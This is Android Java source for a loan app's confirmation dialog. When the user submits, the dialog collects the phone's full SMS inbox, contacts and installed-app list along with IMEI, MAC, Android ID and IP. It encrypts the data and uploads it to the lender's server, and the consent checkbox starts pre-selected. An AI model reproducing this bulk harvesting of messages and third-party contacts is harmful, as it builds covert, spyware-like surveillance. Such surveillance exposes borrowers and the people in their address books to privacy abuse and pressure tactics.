package com.tiny.cash.loan.card.ui.dialog.fragment;

import android.app.Dialog;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;

import com.alibaba.fastjson.JSON;
import com.tiny.cash.loan.card.KudiCreditApp;
import com.tiny.cash.loan.card.Constants;
import com.tiny.cash.loan.card.kudicredit.R;
import com.tiny.cash.loan.card.ui.bean.ContactInfo;
import com.tiny.cash.loan.card.ui.bean.InstallPackageInfo;
import com.tiny.cash.loan.card.ui.bean.SmsInfo;
import com.tiny.cash.loan.card.kudicredit.databinding.DialogConfirmLoanBinding;
import com.tiny.cash.loan.card.ui.dialog.BaseDialogBuilder;
import com.tiny.cash.loan.card.ui.dialog.BaseDialogFragment;
import com.tiny.cash.loan.card.ui.dialog.iface.INegativeButtonDialogListener;
import com.tiny.cash.loan.card.utils.AESUtil;
import com.tiny.cash.loan.card.utils.CommonUtils;
import com.tiny.cash.loan.card.utils.DeviceInfo;
import com.tiny.cash.loan.card.utils.FirebaseLogUtils;
import com.tiny.cash.loan.card.utils.KvStorage;
import com.tiny.cash.loan.card.utils.LocalConfig;
import com.tiny.cash.loan.card.utils.NetworkUtil;
import com.tiny.cash.loan.card.utils.PhoneInfoContent;
import com.tiny.cash.loan.card.utils.ui.ToastManager;

import com.tiny.cash.loan.card.net.ResponseException;
import com.tiny.cash.loan.card.net.NetManager;
import com.tiny.cash.loan.card.net.NetObserver;
import com.tiny.cash.loan.card.net.response.data.bean.AuthResult;
import com.tiny.cash.loan.card.net.response.data.order.OrderStatus;
import com.tiny.cash.loan.card.net.response.data.order.LoanTrial;
import com.tiny.cash.loan.card.net.request.params.ApplyParams;
import com.tiny.cash.loan.card.net.request.params.AuthParams;
import com.tiny.cash.loan.card.net.response.Response;

import org.greenrobot.eventbus.EventBus;

import java.util.List;

import androidx.fragment.app.FragmentManager;
import com.tiny.cash.loan.card.message.EventMessage;

import io.reactivex.Observable;
import io.reactivex.ObservableEmitter;
import io.reactivex.ObservableOnSubscribe;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.schedulers.Schedulers;

public class ConfirmLoanDialogFragment extends BaseDialogFragment<ConfirmLoanDialogFragment.DialogBuilder> {

    private String orderId;
    private AuthParams params;
    private ApplyParams applyParams;

    public static DialogBuilder createBuilder(Context context, FragmentManager fragmentManager) {
        return new DialogBuilder(context, fragmentManager);
    }

    @Override
    public int resolveTheme() {
        return R.style.SDL_Dialog;
    }

    @Override
    protected int getDialogLayout() {
        return R.layout.dialog_confirm_loan;
    }

    @Override
    public void onActivityCreated(Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        if (getArguments() == null) {
            throw new IllegalArgumentException("use DownloadProgressDialogBuilder to construct this dialog");
        }
        Dialog dialog = getDialog();
        if (dialog != null) {
            Window window = dialog.getWindow();
            if (window != null) {
                //去除系统自带的margin
                window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
                //设置dialog在界面中的属性
                window.setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.WRAP_CONTENT);
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        CommonUtils.disposable(authInfoObserver);
    }

    String appVersion = null;
    String verCode = null;

    private void CreateAuthInfo() {
        // TODO: 2022/11/25 后续要把上传短信那块做限制，短信太多会提交不成功
        PhoneInfoContent phoneInfoContent = new PhoneInfoContent(getActivity());
        List<SmsInfo> smsInfo = phoneInfoContent.getSmsInfo();
        List<ContactInfo> contactInfos = phoneInfoContent.getConnect();
//      List<CallInfo> callInfos = phoneInfoContent.getContentCallLog();
        List<InstallPackageInfo> installedPackages = phoneInfoContent.getInstalledPackages();
        String deviceId = KvStorage.get(LocalConfig.LC_DEVICEID, "");
        String imei = KvStorage.get(LocalConfig.LC_IMEI, "");
        String brand = KvStorage.get(LocalConfig.LC_BRAND, "");
        String acconutId = KvStorage.get(LocalConfig.LC_ACCOUNTID, "");
        String macAddress = DeviceInfo.getInstance(getContext()).getMacAddress();
        String androidId = DeviceInfo.getInstance(getContext()).getAndroidId();
        String ipAddress = new NetworkUtil().getIpAddress(getContext());

        try {
            PackageInfo pInfo = KudiCreditApp.getInstance().getPackageManager().getPackageInfo(KudiCreditApp.getInstance().getPackageName(), 0);
            appVersion = pInfo.versionName;   //version name
            verCode = String.valueOf(pInfo.versionCode);      //version code
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        params = new AuthParams();
        if (smsInfo != null) {
            params.setSms(smsInfo.size() > 0 ? AESUtil.encryptAES(JSON.toJSON(smsInfo).toString()) : "");
        }
//        params.setCall(callInfos);
        if (contactInfos != null) {
            params.setContacts(contactInfos.size() > 0 ? AESUtil.encryptAES(JSON.toJSON(contactInfos).toString()) : "");
        }
        if (installedPackages != null) {
            params.setAppList(installedPackages.size() > 0 ? AESUtil.encryptAES(JSON.toJSON(installedPackages).toString()) : "");
        }
        params.setAndroidId(androidId);
        params.setBrand(brand);
        params.setDeviceUniqId(deviceId);

        params.setImei(imei);
        params.setInnerVersionCode(verCode);
        params.setMac(macAddress);
        params.setPubIp(ipAddress);
        params.setUserIp(ipAddress);
        params.setAccountId(acconutId);
        params.setOrderId(orderId);

    }

    NetObserver authInfoObserver;

    private void upLoadAuthInfo() {
        Observable observable = NetManager.getApiService().upLoadAuthInfo(params)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread());
        CommonUtils.disposable(authInfoObserver);

        authInfoObserver = new NetObserver<Response<AuthResult>>() {
            @Override
            public void onNext(Response<AuthResult> response) {
                dismissProgressDialogFragment();
                if (response.isSuccess()) {
                    if (response.getBody().isHasUpload()) {
                        submitOrderApply();
                    } else {
                        showToast(response.getBody().getFailReason());
                    }
                } else {
                    showToast(response.getStatus().getMsg());
                }
            }

            @Override
            public void onException(ResponseException netException) {
                dismissProgressDialogFragment();
            }
        };
        observable.subscribeWith(authInfoObserver);
    }

    private void submitOrderApply() {
        Observable observable = NetManager.getApiService().SubmitOrderApply(applyParams)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread());
        CommonUtils.disposable(authInfoObserver);
        if (isAdded()) {
            showProgressDialogFragment(getContext().getString(R.string.str_loading), false);
        }
        authInfoObserver = new NetObserver<Response<OrderStatus>>() {
            @Override
            public void onNext(Response<OrderStatus> response) {
                dismissProgressDialogFragment();
                if (response.isSuccess()) {
                    if (Constants.ONE.equals(response.getBody().getStatus())) {

                        if (LocalConfig.isNewUser())
                            FirebaseLogUtils.Log("af_new_apply_confirm");
                        else
                            FirebaseLogUtils.Log("af_old_apply_confirm");
                        EventBus.getDefault().post(new EventMessage(EventMessage.UPLOADACTIVITY));
                        dismissAllowingStateLoss();
                    }
                } else {
                    showToast(response.getStatus().getMsg());
                }
            }

            @Override
            public void onException(ResponseException netException) {
                dismissProgressDialogFragment();
            }
        };
        observable.subscribeWith(authInfoObserver);
    }

    boolean flag = false;
    public String split(String s){
        return s.substring(0,s.length()-2);
    }
    @Override
    protected void build(DialogBuilder builder) {
        FirebaseLogUtils.Log("ConfirmLoanProduct");
        final DialogConfirmLoanBinding binding = builder.getBinding();
        binding.cbAgree.setSelected(true);
        if (builder.applyParams != null) {
            orderId = builder.applyParams.orderId;
            applyParams = builder.applyParams;
        }

        if (builder.mLoanTrial != null) {
            binding.tvTotalMoney.setText(split(builder.mLoanTrial.getTotalRepaymentAmount()));
            List<LoanTrial.TrialBean> trialBeanList = builder.mLoanTrial.getTrial();
            for (LoanTrial.TrialBean trialBean : trialBeanList) {
                if (Constants.ONE.equals(trialBean.getStageNo())) {
                    binding.tvDueDate.setText(trialBean.getRepayDate().substring(0, 10));
                }
            }
        }
        binding.btnCancel.setOnClickListener(v -> {
            dismissAllowingStateLoss();
        });
        binding.btnSubmit.setOnClickListener(v -> {
            if (binding.cbAgree.isSelected()) {
                submitData();
            } else {
                ToastManager.show(getContext(), "Please agree to check the agreement");
            }
        });
        binding.cbAgree.setOnClickListener(view -> {
            flag = !flag;
            view.setSelected(flag);
        });
        binding.tvPrivacy.setOnClickListener(v -> {
            AgreeTermsFragment.createBuilder(getContext(), getChildFragmentManager())
                    .setMessage(Constants.TWO)
                    .show();
        });
    }

    private void submitData() {
        if (isAdded()) {
            showProgressDialogFragment(getContext().getString(R.string.str_loading), false);
        }
        Observable.create(new ObservableOnSubscribe<Boolean>() {
            @Override
            public void subscribe(ObservableEmitter<Boolean> emitter) {
                CreateAuthInfo();
                emitter.onNext(true);
            }
        }).subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new NetObserver<Boolean>() {
                    @Override
                    public void onNext(Boolean aBoolean) {
                        super.onNext(aBoolean);
                        upLoadAuthInfo();
                    }
                });
    }

    public static class DialogBuilder extends BaseDialogBuilder<ConfirmLoanDialogFragment, DialogConfirmLoanBinding, DialogBuilder> {

        private INegativeButtonDialogListener mNegativeButtonListener;
        private CharSequence mMessage;
        private CharSequence mPositiveButtonText;
        private CharSequence mNegativeButtonText;
        private LoanTrial mLoanTrial;
        ApplyParams applyParams;

        private DialogBuilder(Context context, FragmentManager fragmentManager) {
            super(context, fragmentManager, ConfirmLoanDialogFragment.class);
        }

        @Override
        protected DialogBuilder self() {
            return this;
        }

        public DialogBuilder setMessage(int messageResourceId) {
            mMessage = mContext.getString(messageResourceId);
            return this;
        }

        public DialogBuilder setBody(LoanTrial body) {
            mLoanTrial = body;
            return this;
        }

        public DialogBuilder setMessage(ApplyParams params) {
            applyParams = params;
            return this;
        }

        public ConfirmLoanDialogFragment.DialogBuilder setNegativeButtonTxt(int textId) {
            return setNegativeButtonTxt(mContext.getText(textId));
        }

        public ConfirmLoanDialogFragment.DialogBuilder setNegativeButtonTxt(CharSequence text) {
            mNegativeButtonText = text;
            return this;
        }

        public ConfirmLoanDialogFragment.DialogBuilder setPositiveButtonTxt(int textId) {
            return setPositiveButtonTxt(mContext.getText(textId));
        }

        public ConfirmLoanDialogFragment.DialogBuilder setPositiveButtonTxt(CharSequence text) {
            mPositiveButtonText = text;
            return this;
        }

        public ConfirmLoanDialogFragment.DialogBuilder setNegativeListener(final INegativeButtonDialogListener listener) {
            mNegativeButtonListener = listener;
            return this;
        }
    }
}
